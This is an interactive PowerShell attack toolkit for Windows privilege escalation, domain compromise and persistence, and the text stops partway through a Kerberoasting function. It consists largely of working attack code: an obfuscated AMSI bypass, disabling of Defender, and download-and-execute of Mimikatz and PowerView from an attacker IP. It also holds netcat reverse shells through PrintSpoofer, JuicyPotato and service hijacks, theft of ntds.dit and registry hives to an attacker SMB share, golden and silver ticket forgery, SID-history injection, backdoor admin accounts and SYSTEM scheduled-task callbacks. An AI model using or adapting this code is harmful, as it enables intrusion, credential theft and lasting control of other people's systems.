<# Script used for Priv Esc within Windows, working progress if you want to add something send it up in a fork. If something doesn't work let me know. 
To run a command just call for the function, such as to run ForgeSID we would confim we are using persistence and then ForgeSID, this will call for that function and output
questions that are needed to ForgeSID history. Each privsec states what functions you can use with each one. Make sure you know what you are doing, some of these can be very
dangerous if you do not do a proper cleanup. All powershell scripts are loaded into memory, very few things hit disk, anything that is wget will be written on disk

Written by OverGrownCarrot1 #>


$AttackerIP = Read-Host -Prompt 'Attacker IP'
$confirmation = Read-Host "Would you like to run an AMSI Bypass? (Y/N):"
      	if ($confirmation -eq 'Y')
      	{
      		write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Running AMSI Bypass"
      	[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true) 
      	}
      	else
      	{
      		'Rgr that sea bass'
      	}  

$confirmation = Read-Host "Domain Priv Esc or Local Priv Esc (DomainPrivEsc/LocalPrivEsc/Persistence)?:"
      	if ($confirmation -eq 'LocalPrivEsc')
      	{
			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] This script can run the following commands DisableRealTimeMonitoring, SeImpersonatePrivilege, BypassUAC, AlwaysInstallElevated, DLLHijack, BackUpOperator, ServerOperator, DNSAdmin, PowerShellScheduledTask, UnquotedServicePath, PortForward. Thanks for using it, built by OverGrownCarrot1"
			start-sleep -seconds 5
			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Running whoami"
			whoami
			start-sleep -seconds 2
			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Running whoami /priv"
			whoami /priv
			start-sleep -seconds 5
			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Running whoami /groups"
			whoami /groups
		}
		
		elseif ($confirmation -eq 'DomainPrivEsc')
		{
			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Will need to upload more tools, PowerView.ps1, PowerView_Dev.ps1, Invoke-Mimikatz.ps1"
			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] This script can run the following commands Kerberoasting, AsRep, Delegation, PassTheHash DCSync"
			start-sleep -seconds 5
		$confirmation = Read-Host "Do you have a web server running on attacker machine with the above tools? (Y/N):"
      	if ($confirmation -eq 'Y')	
      	{
      		$AttackerIP = Read-Host -Prompt 'AttackerIP'
      		iex (iwr -usebasicparsing http://$AttackerIP/PowerView.ps1);iex (iwr -usebasicparsing http://$AttackerIP/PowerView_Dev.ps1);iex (iwr -usebasicparsing http://$AttackerIP/Invoke-Mimikatz.ps1)
      		wget -usebasicparsing http://$AttackerIP/Kekeo.zip -outfile C:\Windows\Temp\Kekeo.zip;expand-archive Kekeo.zip
      	}
			else
			{
				'Turn on web server'
			}
		}

		elseif ($confirmation -eq 'Persistence')
		{
			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] This script can run the following commands AddUserWithAdminPrivs, PassTheTicket, ForgeSID, ScheduledTask"
			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Will need other tools ready, Invoke-Mimikatz.ps1, PowerView.ps1, PowerView_Dev.ps1, DSInternals"
			start-sleep -seconds 2
			$confirmation = Read-Host "Do you have a web server running on attacker machine with the above tools? (Y/N):"
      	if ($confirmation -eq 'Y')
      		{
			iex (iwr -usebasicparsing http://$AttackerIP/Invoke-Mimikatz.ps1)
			iex (iwr -usebasicparsing http://$AttackerIP/PowerView.ps1)
			iex (iwr -usebasicparsing http://$AttackerIP/PowerView_Dev.ps1)
      		}
      	else {'Well turn the thing on!!!'}
		}

		else {'Come on man... this is going to be rough'}

<# When a User has SeImpersonatePrivilege an attacker may be able to become NT System Authority, utilize the following script against the victim machine #>

Function DisableRealTimeMonitoring
{
	set-mppreference -DisableRealTimeMonitoring $True
	set-mppreference -DisableIOAVProtection $True
	write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Disabled Real Time Monitoring and IOAV, if it worked should be set to True in get-mppreference"
	start-sleep -seconds 5
	get-mppreference
}

Function SeImpersonatePrivilege
	{
			[cmdletbinding()] Param(
        
        	[Parameter(Position = 0, Mandatory = $true)]
        	[string]
        	$AttackerIP

		)
			if ($AttackerIP)
		{

			$LPORT = Read-Host -Prompt "Listening Port on $AttackerIP"
			$NC = Read-Host -Prompt 'What version of nc do you want nc64.exe or nc.exe ex: nc64.exe:'

			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Make sure that $NC and PrintSpoofer.exe are both on $AttackerIP system, and web server is turned on"

			$confirmation = Read-Host "Do you have your listener running on $AttackerIP and web server running on port 80 (Y/N)?:"
      	if ($confirmation -eq 'y')

      	{
      	
      	systeminfo
      	start-sleep -seconds 3
      	write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Ran SystemInfo"
      	}

      	$confirmation = Read-Host "Is windows version 2016 or over, over for 2016 (Over/Under)?:"
      	if ($confirmation -eq 'over')
      		{
      			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Downloading PrintSpoofer.exe"
      			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Downloading $NC"

      		wget http://$AttackerIP/PrintSpoofer.exe -outfile C:\Windows\Temp\PrintSpoofer.exe
      		wget http://$AttackerIP/$NC -outfile C:\Windows\Temp\$NC
      		cd C:\Windows\Temp
      		.\PrintSpoofer.exe -c ".\$NC $AttackerIP $LPORT -e C:\Windows\System32\cmd.exe"
      		}

      	elseif ($confirmation -eq 'under')
      		{
      		write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Downloading JuicyPotato.exe"
      				
      	cd C:\Windows\Temp
      	wget http://$AttackerIP/JuicyPotato.exe -outfile JuicyPotato.exe
      	wget http://$AttackerIP/$NC -outfile $NC
      	./JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c $NC -e cmd.exe $AttackerIP $LPORT " -t *

    		}

       	else {'Was it patched? Is print spooler turned on? WHAT SORCERY IS THIS!!!'}
    }
}
      	
Function AlwaysInstallElevated
{
[cmdletbinding()] Param(
        
        	[Parameter(Position = 0, Mandatory = $true)]
        	[string]
        	$AttackerIP

		)
			if ($AttackerIP)

	{
					$LPORT = Read-Host -Prompt "Listening Port on $AttackerIP"
					$MSI = Read-Host -Prompt "Name of MSI File ex shell.msi"
					write-host -foregroundcolor yellow -backgroundcolor black "Make msfvenom file with following msfvenom -p windows/shell_reverse_tcp LPORT=$LPORT LHOST=$AttackerIP -f msi > $MSI"
					$confirmation = Read-Host "Do you have your listener running on $AttackerIP or port $LPORT and web server running on port 80 (Y/N)?:"
      	if ($confirmation -eq 'y')

      	{  
      		wget -usebasicparsing http://$AttackerIP/$MSI -outfile C:\Windows\Temp\$MSI 
      		write-host -foregroundcolor green -backgroundcolor black "Downloaded $MSI to C:\Windows\Temp"
      		cd C:\Windows\Temp
      		cmd /c "msiexec /quiet /qn /i $MSI"
      	}
      	else {'Alright... is AlwaysInstallElevated even turned on...'}
    }
}

Function BackUpOperator
{
	<# The following script is to be ran if a user is a Backup Operator. Remember you will need to copy system.bak and ntds.dit to your
	attacker machine, the following script will try and do it for you, but you will need to set up your own smbserver with the following
	smbserver.py -smb2support share .
	#>

	[cmdletbinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $AttackerIP
    )
    if ($AttackerIP)
    {

		write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Writing Script"

    cd C:\Windows\Temp;

echo "set verbose on" > script.txt
echo "set metadata C:\Windows\Temp\meta.cab" >> script.txt 
echo "set context clientaccessible" >> script.txt 
echo "set context persistent" >> script.txt 
echo "begin backup" >> script.txt 
echo "add volume C: alias cdrive" >> script.txt 
echo "create" >> script.txt 
echo "expose %cdrive% E:" >> script.txt 
echo "end backup" >> script.txt
    
    	write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Running Disk Shadow"

      cd C:\Windows\Temp;

 			diskshadow /s script.txt
		
 		write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Running Robocopy for ntds.dit"

 			robocopy /b E:\Windows\ntds . ntds.dit

 		write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Saving system.bak"

 			reg save hklm\system C:\Windows\Temp\system.bak

 		write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Copying ntds.dit and system.bak to $AttackerIP, Please ensure you have an SMB Server running"
 		
$confirmation = Read-Host "Confirm SMB Server has been started on $AttackerIP (Y/N):"
if ($confirmation -eq 'y') 
  {
      write-host -foregroundcolor green -backgroundcolor black "`n`n[*] You have confirmed to continue"

 			cp C:\Windows\Temp\system.bak \\$AttackerIP\share

			cp C:\Windows\Temp\ntds.dit \\$AttackerIP\share	

		write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] On attacker machine run the following secretsdump.py -system system.bak -ntds ntds.dit local, remember this is if impacket has been exported, if not will need full file path"
    }
    else
    {
    		'Uh.... something went to crap...'
    }
  }
}

function ServerOperator
{

<# 

This script is used when a user has server operator, you do need a service. If you do not know a service, and server operator is being used
You can always try and use vss service. You will need nc64.exe in your web server directory. Once you get a call back you have limited time
on the machine, this is just because of the call back you are getting and the service trying to restart, windows will finally say screw it and shut it down
so make sure you move fast and get what you need, or have another nc64.exe ready to go to make a 2nd call back, which will be more stable. To do this
quickly at the end of the attack on the PowerShell script that is a copy and paste output that can be used for port 1111

#>

[cmdletbinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $AttackerIP

)
 	if ($AttackerIP)
		{
			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Trying to download nc64.exe"
			
			cd C:\Windows\Temp; wget http://$AttackerIP/nc64.exe -outfile nc64.exe

			$RunningService = Read-Host -Prompt 'Input Running Service if unknown try vss'
			$Port = Read-Host -Prompt 'Input Reverse Shell Port ex 4444'
			
			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Changing service binpath to C:\Windows\Temp"

			sc.exe config $RunningService binpath="C:\Windows\Temp\nc64.exe -e cmd.exe $AttackerIP $Port"

			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Trying to stop $RunningService"

			stop-service $RunningService -force

			 $confirmation = Read-Host "Do you have your listener running on $AttackerIP (Y/N)?:"
      if ($confirmation -eq 'y')

        {
        
        write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Trying to start $RunningService"

        write-host -foregroundcolor green -backgroundcolor black "`n`n[*] C:\Windows\Temp\nc64.exe -e cmd $AttackerIP 1111"

		start-service $RunningService
        
        }

    else

    	{

        'Didnt know the powershell file was a wizard... you only have to answer a couple of questions'
        
    	}
   	}
}


function DNSAdmin
{

	<# The following script is if a user is within the dns admin group #>

	[cmdletbinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $True)]
        [string]
        $AttackerIP
      )

       
    if ($AttackerIP)
    {

    	$LPORT = Read-Host -Prompt 'LPORT ex 4444'

    	write-host -foregroundcolor green -backgroundcolor black "First setup a serverplugin.dll utilizing msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$AttackerIP LPORT=$LPORT -f dll > serverlevelplugin.dll on $AttackerIP machine"

    	$confirmation = Read-Host "Did you make dll file and have a python web server running on port 80 (Y/N)?:"
      if ($confirmation -eq 'y')

      {
      	write-host -foregroundcolor yellow -backgroundcolor black "Downloading serverlevelplugin.dll and changing dnscmd config"

      	wget http://$AttackerIP/serverlevelplugin.dll -outfile C:\Windows\Temp\serverlevelplugin.dll

      	dnscmd 127.0.0.1 /config /serverlevelplugindll C:\Windows\Temp\serverlevelplugin.dll 

      }
      else
      {
      	
      }

      	$confirmation = Read-Host "Do you have a listener running on $AttackerIP on port $LPORT ex use exploit/multi/handler (Y/N)?:"
      if ($confirmation -eq 'y')

      {

      	write-host -foregroundcolor yellow -backgroundcolor black "Stopping DNS"

      	cmd /c "sc stop dns"

      	write-host -foregroundcolor yellow -backgroundcolor black "Starting DNS"

      	cmd /c "sc start dns"

      }
      else
      {
      	'Yes... This does cause a lot of problems... yes... you just kept clicking enter...'
      }
    }
}

<# Used for DLL Hijacking #>

Function DLLHijack
{
	[cmdletbinding()] Param(
        
        	[Parameter(Position = 0, Mandatory = $true)]
        	[string]
        	$AttackerIP

		)
			if ($AttackerIP)

	{
		$LPORT = Read-Host -Prompt "Listening Port on $AttackerIP ex 4444"
		$DLL = Read-Host -Prompt "Hijackable DLL File ex: kavremoverenu.dll"
		$Location = Read-Host -Prompt "Location DLL file should be uploaded ex C:\Program Files\DLLHijack is Missing\"
		write-host -foregroundcolor yellow -backgroundcolor black "Make sure you have a web server on port 80 and utilize the following msfvenom -p windows/shell_reverse_tcp LHOST=$AttackerIP LPORT=$LPORT -f dll > $DLL"
		$confirmation = Read-Host "Do you have a listener running and msfvenom file made (Y/N)?:"
      if ($confirmation -eq 'y')
     	{
     		wget http://$AttackerIP/$DLL -outfile $Location/$DLL
     		write-host -foregroundcolor yellow -backgroundcolor black "Putting $DLL in the following $Location"
     	}
     	else {}
     	$confirmation = Read-Host "Is Service Running as scheduled task, on startup or not running and needs to be started (Scheduled/Startup/NotRuning)?:"
      if ($confirmation -eq 'Scheduled')
      	{
      		'Now we wait for call back'
      	}
      elseif ($confirmation -eq 'Startup')
      	{
      		write-host -foregroundcolor yellow -backgroundcolor black "Restarting Computer"
      		restart-computer
      	}
      elseif ($confirmation -eq 'NotRunning')
      	{
      $Executable = Read-Host -Prompt "Executable that needs to be ran with location ex C:\Program Files\DLLHijack\dll.exe"
      $Executable
      	}
      else {'WTF Mate, help me a little...'}
	}
}

Function PowerShellScheduledTask
{
		[cmdletbinding()] Param(
        
        	[Parameter(Position = 0, Mandatory = $true)]
        	[string]
        	$AttackerIP

		)
			if ($AttackerIP)
	{
		$LPORT = Read-Host -Prompt "Listening Port on $AttackerIP ex 4444"
		$Location = Read-Host -Prompt "Location of PowerShell .ps1 file DO NOT ADD .PS1 at the end ex: C:\Program Files\"
		$File_Name = Read-Host -Promp "Name of Powershell file you wish to overwrite or append"
		$confirmation = Read-Host "Do you want to rewrite file with Invoke-PowerShellTcp.ps1, send Net_NTLM Hash through SMB or use nc64.exe (PowerShellTcp/SMB/nc64.exe)?:"
      if ($confirmation -eq 'PowerShellTcp')
      {
      	write-host -foregroundcolor yellow -backgroundcolor black "Ensure you have a web server running on port 80 and Invoke-PowerShellTcp.ps1 within that server folder with a listener on $LPORT"
      	wget -usebasicparsing http://$AttackerIP/Invoke-PowerShellTcp.ps1 -outfile $Location\Invoke-PowerShellTcp.ps1
      	echo "Invoke-PowerShellTcp -port $LPORT -ip $AttackerIP -reverse" >> C:\Windows\Temp\Invoke-PowerShellTcp.ps1
      	write-host -foregroundcolor yellow -backgroundcolor black "Appened Invoke-PowerShellTcp.ps1 with the following Invoke-PowerShellTcp -port $LPORT -ip $AttackerIP -reverse"
      	cd C:\Windows\Temp 
      	cp Invoke-PowerShellTcp.ps1 $Location
      	cd $Location
      	ren $File_Name $File_Name.bak
      	ren Invoke-PowerShellTcp $File_Name
      }
      elseif ($confirmation -eq 'SMB')
      {
      	write-host -foregroundcolor yellow -backgroundcolor black "Start SMB server with smbserver.py -smb2support share . or start responder with SMB turned on, do this on $AttackerIP"
      	echo "\\$AttackerIP\share" >> $Location/$File_Name
      	write-host -foregroundcolor yellow -backgroundcolor black "PowerShell file has been appeneded"
      	type $Location/$File_Name
      }
      elseif ($confirmation -eq 'nc64.exe')
      {
      	write-host -foregroundcolor yellow -backgroundcolor black "Make sure you have web server with nc64.exe and a listener running on port $LPORT"
      	wget -usebasicparsing http://$AttackerIP/nc64.exe -outfile C:\Windows\Temp\nc64.exe
      	cd $Location
      	echo "nc64.exe -e cmd.exe $AttackerIP $LPORT" >> $File_Name
      	write-host -foregroundcolor yellow -backgroundcolor black "Appened file $File_Name"
      	type $File_Name
      }
      else {
      	'Alright dude... you have to choose something I am not a wizard'
      }

      $confirmation = Read-Host "Is PowerShell file runing on Schedule or on Startup (Schedule/Startup)?:"
      if ($confirmation -eq 'Schedule')
      {
      	'Now we wait'
      }
      elseif ($confirmation -eq 'Startup')
      {
      write-host -foregroundcolor yellow -backgroundcolor black "Restaring System"
      restart-computer
      }
		else {'Some people just want to watch the world burn'}
	}
}

Function UnquotedServicePath
{
	[cmdletbinding()] Param(
        
        	[Parameter(Position = 0, Mandatory = $true)]
        	[string]
        	$AttackerIP

		)
			if ($AttackerIP)
		{
	$LPORT = Read-Host -Prompt "Listening Port on $AttackerIP ex 4444"
	$Location = Read-Host -Prompt "Location of UnquotedServicePath DO NOT ADD .EXE at the end ex: C:\Program Files(x86)\Wise\Wise Care Stuff\"
	$File_Name = Read-Host -Prompt "File name that will be used for exploit ex: wise.exe"
	$Service = Read-Host -Prompt "What is the name of the service running ex: wisecareassistant"
	write-host -foregroundcolor yellow -backgroundcolor black "Create msfvenom file with the following msfvenom -p windows/shell_reverse_tcp LHOST=$AttackerIP LPORT=$LPORT -f exe > $File_Name"
	write-host -foregroundcolor yellow -backgroundcolor black "Start web server on $AttackerIP and make sure listener is running"
	$confirmation = Read-Host "Do you want to restart Service, run Executable, or restart computer (Service/Executable/RestartComputer)?:"
      if ($confirmation -eq 'Service')
      	{
      		write-host -foregroundcolor yellow -backgroundcolor black "Showing Running Services"
      		start-sleep -seconds 3
      		service
      		write-host -foregroundcolor yellow -backgroundcolor black "Showing rights for services"
      		start-sleep -seconds 3
      		cmd /c sc query $Service
      		powershell
      		write-host -foregroundcolor yellow -backgroundcolor black "Downloading $File_Name and putting in $Location"
      		wget -usebasicparsing http://$AttackerIP/$File_Name -outfile $Location/$File_Name
      		write-host -foregroundcolor yellow -backgroundcolor black "Restarting Service in 5 seconds, make sure listener is running"
      		start-sleep -seconds 5
      		restart-service $Service
       	}
       elseif ($confirmation -eq 'Executable')
       {
       		$Executable = Read-Host -Prompt "Executable name to start, the actual executable not your msfvenom"
       		$Exe_Location = Read-Host -Prompt "Executable file path, the actual path not your msfvenom path"
       		write-host -foregroundcolor yellow -backgroundcolor black "Downloading $File_Name putting in $Exe_Location"
       		wget -usebasicparsing http://$AttackerIP/$File_Name -outfile $Location/$File_Name
       		write-host -foregroundcolor yellow -backgroundcolor black "Starting Executable, make sure listener is running"
       		start-sleep -seconds 3
       		cd $Exe_Location
       		.\$Executable
       }
       elseif ($confirmation -eq 'RestartComputer')
       {
       		write-host -foregroundcolor yellow -backgroundcolor black "Downloading $File_Name and putting in $Location"
      		wget -usebasicparsing http://$AttackerIP/$File_Name -outfile $Location/$File_Name
      		write-host -foregroundcolor yellow -backgroundcolor black "Restart Computer make sure listener is running"
      		start-sleep -seconds 5
      		restart-computer
      	}
      	else {'For real dude... all that work and you didnt even input something...'}
    }
}
    Function PortForward
{
	[cmdletbinding()] Param(
        
        	[Parameter(Position = 0, Mandatory = $true)]
        	[string]
        	$AttackerIP

		)
	
	if ($AttackerIP)
	{
			write-host -foregroundcolor yellow -backgroundcolor black "Running Netstat -ano"
			start-sleep -seconds 3
			netstat -ano
			start-sleep -seconds 2
			$RPORT = Read-Host -Prompt "Port to forward"
			$LHOST = Read-Host -Prompt "Name of $AttackerIP machine ex: kali"
		$confirmation = Read-Host "Port Forward with SSH or Chisel (SSH/Chisel)?:"
      if ($confirmation -eq 'SSH')
      {
      	write-host -foregroundcolor yellow -backgroundcolor black "Make sure SSH is ready on $AttackerIP with sudo systemctl enable ssh and sudo systemctl start ssh"
      	start-sleep -seconds 3
      	ssh $LHOST@$AttackerIP -R $RPORT:localhost:$RPORT
      	write-host -foregroundcolor yellow -backgroundcolor black "Port Fowarded"
      }
      elseif ($confirmation -eq 'Chisel')
      {
      $LPORT = Read-Host -Prompt "Listening Port"
      write-host -foregroundcolor yellow -backgroundcolor black "Ensure that web server is running with ./chisel.exe"
      write-host -foregroundcolor yellow -backgroundcolor black "Ensure $AttackerIP runs ./chisel server -p $LPORT --reverse"
      start-sleep -seconds 3
      wget -usebasicparsing http://$AttackerIP/chisel.exe -outfile C:\Windows\Temp\chisel.exe
      cd C:\Windows\Temp
      ./chisel.exe client $AttackerIP R:$RPORT:127.0.0.1:$RPORT
      write-host -foregroundcolor yellow -backgroundcolor black "Port Fowarded"
    	}
    	else {'Head like a hole?'}
    }
}

Function AddUserWithAdminPrivs
{
	$confirmation = Read-Host "Change current users password or make a new user (Current/New)?"
      if ($confirmation -eq 'Current')
      {
      	$Current_User = Read-Host -Prompt 'Current user name'
      	$Current_Pass = Read-Host -Prompt 'Password you want, remember must meet complexity requirements'
      	net user $Current_User $Current_Pass
      		write-host -foregroundcolor yellow -backgroundcolor black "Changed $Current_User password to $Current_Pass"
      	net localgroup "Administrators" /add $Current_User
      		write-host -foregroundcolor yellow -backgroundcolor black "Put user in Administrators group just in case"
      	net localgroup "Remote Desktop Users" /add $Current_User
      		write-host -foregroundcolor yellow -backgroundcolor black "Put user in Remote Desktop Users group just in case"
      	net localgroup "Remote Management Users" /add $Current_User
      		write-host -foregroundcolor yellow -backgroundcolor black "Put user in Remote Management Users (winrm) just in case"
      }
      elseif ($confirmation -eq 'New')
      {
	$User = Read-Host -Prompt 'Username to add ex ad1mn'
	$Pass = Read-Host -Prompt 'Password to add, remember must meet complexity ex P@ssw0rd1'
	net user $User $Pass /add
      		write-host -foregroundcolor yellow -backgroundcolor black "Added $User password $Pass"
      	net localgroup "Administrators" /add $User
      		write-host -foregroundcolor yellow -backgroundcolor black "Put $user in Administrators group just in case"
      	net localgroup "Remote Desktop Users" /add $User
      		write-host -foregroundcolor yellow -backgroundcolor black "Put $user in Remote Desktop Users group just in case"
      	net localgroup "Remote Management Users" /add $User
      		write-host -foregroundcolor yellow -backgroundcolor black "Put $user in Remote Management Users just in case"
      }
      else {'Cant make a user out of thin air, well we can but you get what I am saying...'}
}

Function PassTheHash
{
	Invoke-Mimikatz -command '"lsadump::lsa /patch"'
	start-sleep -seconds 3
	$User = Read-Host -Prompt 'Input Username'
    $Domain = Read-Host -Prompt 'Input Domain Name'
    $NTLM = Read-Host -Prompt 'Input NT Hash'
    write-host -foregroundcolor green -backgroundcolor black Run the following command 
    write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""sekurlsa::pth /user:$User /domain:$Domain /ntlm:$NTLM /run:powershell.exe""'"
}

Function DCSync
{
	Invoke-Mimikatz -command '"lsadump::lsa /patch"'
	start-sleep -seconds 3
	$User = Read-Host -Prompt 'Input Username (Usually KRBTGT for this attack)'
    $Domain = Read-Host -Prompt 'Input Domain Name'
    write-host -foregroundcolor green -backgroundcolor black Run the following command "Invoke-Mimikatz -command '""lsadump::dcsync /user:$Domain\$User""'"
}

Function PassTheTicket
{
	write-host -foregroundcolor yellow -backgroundcolor black "Dumping LSA for KRBTGT Hash"
	start-sleep -seconds 2
	Invoke-Mimikatz -command '"lsadump::lsa /patch"'
	start-sleep -seconds 3
	$User = Read-Host -Prompt 'Username does not need to be real can be administrator'
	$Sid = Read-Host -Prompt 'SID'
	$Domain = Read-Host -Prompt 'Domain name ex hatter.local'
	$Domain_Controller = Read-Host -Prompt 'Domain Contoller name ex dc-01'
	$id = Read-Host -prompt 'ID, if unknown use 500'
	$groups = Read-Host -prompt 'Groups, if unknown use 512'

	$confirmation = Read-Host "Golden or Silver Ticker (Golden/Silver)?"
      if ($confirmation -eq 'Golden')
      {
	$Hash = Read-Host -Prompt 'KRBTGT Hash'
	start-sleep -seconds 1
	write-host -foregroundcolor green -backgroundcolor black Copy and paste following command Invoke-Mimikatz -command "'""kerberos::golden /user:$User /ntlm:$Hash /domain:$domain /sid:$sid /id:$id /groups:$Groups /ptt""'"
		}
	
	elseif ($confirmation -eq 'Silver')
	{
		write-host -foregroundcolor yellow -backgroundcolor black "Dumping LSA"
		start-sleep -seconds 2
		Invoke-Mimikatz -command '"lsadump::lsa /patch"'
		start-sleep -seconds 3
	 	$Target = Read-Host -Prompt 'Input Target such as domain controller example dcorp-dc.domain.local'
        $Service = Read-Host -Prompt 'Input Service such as CIFS'
        $RC4 = Read-Host -Prompt 'Input RC4 Hash'
        write-host -foregroundcolor green -backgroundcolor black Invoke-Mimikatz -command "'""kerberos::golden /domain:$Domain /sid:$sid /target:$Target /service:$Service /rc4:$RC4 /user:$User /ptt""'"
    }
    else {"What ticket do you want"}

    write-host -foregroundcolor yellow -backgroundcolor black "Dumping Klist"
    start-sleep -seconds 2
    klist.exe
    start-sleep -seconds 2
    $confirmation = Read-Host -Prompt "Directory search on domain contoller or session (Directory/Session)?"
      if ($confirmation -eq 'Directory')
      {
      	ls //$Domain_Controller.$domain/c$
      }
      elseif ($confirmation -eq 'Session')
      {
    $sess = new-pssession -computername $Domain_Controller
    $sess
    start-sleep -seconds 1
    enter-pssession -session $sess
    	}
    else {'I dont know what you want...'}
}

Function ForgeSID
	{
		whoami
		start-sleep -seconds 1
		write-host -foregroundcolor yellow -backgroundcolor black "Installing DSInternals"
		install-module DSInternals -Force
		start-sleep -seconds 1
		$Name = Read-Host -prompt 'Username of current user'
		write-host -foregroundcolor yellow -backgroundcolor black "Getting $Name information"
		get-aduser $Name -properties sidhistory,memberof
		write-host -foregroundcolor yellow -backgroundcolor black "Getting Domain Admins"
		start-sleep -seconds 3
		Get-ADGroup "Domain Admins"
		$SID = Read-Host -Prompt 'SID, do not need the last 3 numbers, SID should look as such S-1-5-21-3885271727-2693558621-2658995185'
		write-host -foregroundcolor yellow -backgroundcolor black "Stopping NTDS"
		Stop-Service -Name ntds -force
		write-host -foregroundcolor yellow -backgroundcolor black "Adding 512 to end of SID History"
		Add-ADDBSidHistory -SamAccountName '$Name' -SidHistory '$SID-512' -DatabasePath C:\Windows\NTDS\ntds.dit
		write-host -foregroundcolor yellow -backgroundcolor black "Starting NTDS Service"
		start-sleep -seconds 1
		Start-Service -Name ntds
		write-host -foregroundcolor yellow -backgroundcolor black "Getting $Name SID History"
		Get-ADUser $Name -properties sidhistory,memberof
		write-host -foregroundcolor yellow -backgroundcolor black "Should now see that the user has an SID History with an SID ending with 5xx, thus putting them as an admin"
		$confirmation = Read-Host -Prompt "Directory search on domain contoller or session (Directory/Session)?"
      if ($confirmation -eq 'Directory')
      {
      	$Domain = Read-Host -Prompt 'Domain name ex hatter.local'
		$Domain_Controller = Read-Host -Prompt 'Domain Contoller name ex dc-01'
      	ls //$Domain_Controller.$domain/c$ 
      }
      elseif ($confirmation -eq 'Session')
      {
    	$Domain = Read-Host -Prompt 'Domain name ex hatter.local'
		$Domain_Controller = Read-Host -Prompt 'Domain Contoller name ex dc-01'
    	$sess = new-pssession -computername $Domain_Controller.$domain
    	whoami
    	}
    else {'I dont know what you want...'}
}

Function ScheduledTask
{
	
	$LPORT = Read-Host -Prompt "Listening Port"
	$Timing = Read-Host -Prompt "How often do you want a call back in minutes"
	$Task_Name = Read-Host -Prompt "What do you want to call your scheduled task"
	$confirmation = Read-Host -Prompt "Do you want a NC call back, msfvenom or Invoke-PowerShellTcp.ps1 (NC/msfvenom/PowerShellTcp)?"
      if ($confirmation -eq 'NC')
    	{
    write-host -foregroundcolor yellow -backgroundcolor black "Make sure you start a web server with nc64.exe"
	wget -usebasicparsing http://$AttackerIP/nc64.exe -outfile C:\Windows\Temp\nc64.exe
	write-host -foregroundcolor yellow -backgroundcolor black "Creating ScheduledTask"
	$action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\nc64.exe" -Argument "-e cmd $AttackerIP $LPORT"
	$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes $Timing)
	$Principal = New-ScheduledTaskPrincipal -UserID "NT Authority\System" -LogonType ServiceAccount
	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "$Task_Name" -Principal $Principal
	write-host -foregroundcolor yellow -backgroundcolor black "Wrote scheduled task utilzing NT Authority System running every $Timing minutes"
		}
	elseif ($confirmation -eq 'msfvenom')
		{
	$MSF = Read-Host -Prompt "msfvenom file name ex shell.exe"
	wget -usebasicparsing http://$AttackerIP/$MSF -outfile C:\Windows\Temp\$MSF
	$action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\$MSF"
	$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes $Timing) 
	$Principal = New-ScheduledTaskPrincipal -UserID "NT Authority\System" -LogonType ServiceAccount
	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "$Task_Name" -Principal $Principal
	write-host -foregroundcolor yellow -backgroundcolor black "Wrote scheduled task utilzing NT Authority System running every $Timing minutes"
		}
	elseif ($confirmation -eq 'PowerShellTcp')
	{
	wget -usebasicparsing http://$AttackerIP/Invoke-PowerShellTcp.ps1 -outfile C:\Windows\Temp\Invoke-PowerShellTcp.ps1
	echo "-reverse -ip $AttackerIP $LPORT" >> C:\Windows\Temp\Invoke-PowerShellTcp.ps1
	$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "C:\Windows\Temp\Invoke-PowerShellTcp.ps1"
	$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes $Timing)
	$Principal = New-ScheduledTaskPrincipal -UserID "NT Authority\System" -LogonType ServiceAccount
	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "$Task_Name" -Principal $Principal
	write-host -foregroundcolor yellow -backgroundcolor black "Wrote scheduled task utilzing NT Authority System running every $Timing minutes"
	}
	else {'Need to pick something there big guy'}
}

Function Kerberoasting
{
	$confirmation = Read-Host -Prompt "This will not work if python is not install on victim machine, continue (Y/N)?"
      if ($confirmation -eq 'Y')
    {
